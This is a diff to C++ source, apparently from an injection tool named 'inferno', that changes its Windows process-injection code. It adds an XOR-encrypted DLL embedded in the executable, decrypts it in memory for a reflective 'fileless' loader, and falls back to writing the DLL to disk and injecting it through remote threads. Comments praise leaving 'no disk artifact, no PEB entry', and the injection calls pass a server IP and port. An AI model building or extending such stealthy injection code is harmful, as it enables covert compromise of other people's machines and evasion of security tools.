@@ -18,6 +18,10 @@
 #include <vector>
 #include <fstream>
 
+#if defined(INFERNO_HAS_EMBEDDED_DLL) && !defined(INFERNO_DLL)
+#include "../include/EmbeddedDll.hpp"
+#endif
+
 namespace inferno { namespace tier2 {
 
 // ── Execution-only helper (always available on Windows, even in tests) ──
@@ -68,6 +72,10 @@ bool injectIntoTarget(DWORD, const std::string&,
 
 #elif defined(_WIN32)
 
+// This function is only needed when we can't use embedded bytes:
+// 1) the DLL build (INFERNO_DLL) — a DLL can't embed itself
+// 2) the EXE build without the Python embedding step
+#if !defined(INFERNO_HAS_EMBEDDED_DLL) || defined(INFERNO_DLL)
 static std::vector<uint8_t> readBinaryFile(const std::string& path) {
     std::ifstream file(path, std::ios::binary | std::ios::ate);
     if (!file) return {};
@@ -80,6 +88,7 @@ static std::vector<uint8_t> readBinaryFile(const std::string& path) {
     }
     return buffer;
 }
+#endif
 
 DWORD findProcessPid(const std::string& exec_path) {
     HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -232,8 +241,12 @@ bool injectIntoTarget(DWORD pid,
                       const std::string& dll_path,
                       const std::string& server_ip,
                       uint16_t server_port) {
-    // Tier 1: Try reflective DLL loader
+    // Tier 1: Try reflective DLL loader (fileless — uses embedded XOR-encrypted bytes)
+#if defined(INFERNO_HAS_EMBEDDED_DLL) && !defined(INFERNO_DLL)
+    std::vector<uint8_t> dll_bytes = inferno::embedded::decryptEmbeddedDll();
+#else
     std::vector<uint8_t> dll_bytes = readBinaryFile(dll_path);
+#endif
     if (!dll_bytes.empty()) {
         HANDLE hProcess = nullptr;
         if (openTargetProcess(pid, hProcess)) {
@@ -252,6 +265,15 @@ bool injectIntoTarget(DWORD pid,
     }
 
     // Tier 2: Standard NT API injection (LoadLibraryA via NtCreateThreadEx)
+#if defined(INFERNO_HAS_EMBEDDED_DLL) && !defined(INFERNO_DLL)
+    // Reflective failed — extract DLL to disk so LoadLibraryA-based tiers can find it
+    if (!inferno::embedded::extractEmbeddedDllTo(dll_path)) {
+        std::fprintf(stderr,
+            "[WindowsInjector] Failed to extract embedded DLL to %s\n",
+            dll_path.c_str());
+        return false;
+    }
+#endif
     HANDLE hProcess = nullptr;
     if (!openTargetProcess(pid, hProcess)) return false;
 
@@ -384,9 +406,13 @@ bool injectIntoTarget(const TargetApp& target,
     switch (target.capability) {
         case InjectionCapability::DYLD_INSERT_LIBRARIES:
         case InjectionCapability::MACH_VM_ALLOCATE:
-            // Tier 1: Try reflective DLL loader first (no disk artifact, no PEB entry).
+            // Tier 1: Try reflective DLL loader first (fileless — embedded XOR-encrypted bytes).
             {
+#if defined(INFERNO_HAS_EMBEDDED_DLL) && !defined(INFERNO_DLL)
+                std::vector<uint8_t> dll_bytes = inferno::embedded::decryptEmbeddedDll();
+#else
                 std::vector<uint8_t> dll_bytes = readBinaryFile(dll_path);
+#endif
                 if (!dll_bytes.empty()) {
                     HANDLE hProcess = nullptr;
                     if (openTargetProcess(pid, hProcess)) {
@@ -410,6 +436,16 @@ bool injectIntoTarget(const TargetApp& target,
             if (injectExecutionOnly(pid, dll_path, server_ip, server_port)) {
                 return true;
             }
+#if defined(INFERNO_HAS_EMBEDDED_DLL) && !defined(INFERNO_DLL)
+            // Reflective + execution-only both failed — extract DLL to disk so
+            // LoadLibraryA-based tiers can find it
+            if (!inferno::embedded::extractEmbeddedDllTo(dll_path)) {
+                std::fprintf(stderr,
+                    "[WindowsInjector] Failed to extract embedded DLL to %s\n",
+                    dll_path.c_str());
+                return false;
+            }
+#endif
             return injectViaRemoteThread(pid, dll_path, server_ip, server_port);
 
         default:
